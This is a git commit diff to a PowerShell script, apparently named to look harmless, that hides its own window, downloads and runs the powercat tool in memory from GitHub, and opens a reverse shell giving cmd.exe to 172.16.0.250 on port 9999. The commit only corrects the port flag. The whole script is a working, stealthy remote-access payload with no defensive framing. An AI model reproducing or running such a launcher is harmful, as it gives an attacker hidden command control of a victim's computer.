bfc09f42196becd0e9fd8c3371354a685691b2f4
DanielRTeixeira <DanielRTeixeira@users.noreply.github.com>
2016-01-10 18:24:28 +0000

    Update NoProblem.ps1

--- Less/NoProblem.ps1
+++ Less/NoProblem.ps1
@@ -2,4 +2,4 @@ $hide = '[DllImport("user32.dll")] public static extern bool ShowWindow(int hand
 add-type -name win -member $hide -namespace native
 [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
 
-IEX ((New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')); powercat -c 172.16.0.250 9999 -e cmd.exe
+IEX ((New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')); powercat -c 172.16.0.250 -p 9999 -e cmd.exe
